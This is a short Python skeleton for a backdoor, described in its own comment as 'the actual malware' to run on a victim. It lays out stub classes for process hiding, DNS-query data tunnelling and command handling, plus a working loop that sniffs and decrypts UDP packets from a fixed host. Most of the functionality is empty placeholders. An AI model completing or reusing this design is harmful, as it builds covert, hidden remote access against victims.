# This will contain the code which will run on the victim. i.e. the actual malware
from scapy.all import sniff
from encryption import StreamEncryption

class ProcessHider():
    """
        This class contains process information, and performs process hiding functions.
    """    
    def __init__(self):
        pass

    def hide(self):
        """
            Hide the process name.
        """
        pass

class NetworkManager():
    """
        This class will handle crafting DNS queries as well as inserting encrypted data.
    """
    def __init__(self):
        pass

    def create_dns_query(self):
        pass


class Backdoor():
    """
        This is the main backdoor class which handles commands, and generates a result.
    """
    def __init__(self):
        pass

e = StreamEncryption()
e.read_nonce("nonce.bin")
e.read_secret("secret.key")
e.initialize_encryption_context()

def receive(pkt):
    print(pkt.show())
    print(e.decrypt(pkt[UDP].payload))

if __name__ == "__main__":
    sniff(filter="ip host 10.0.0.159 and udp sport 10069", iface="enp1s0", prn=receive)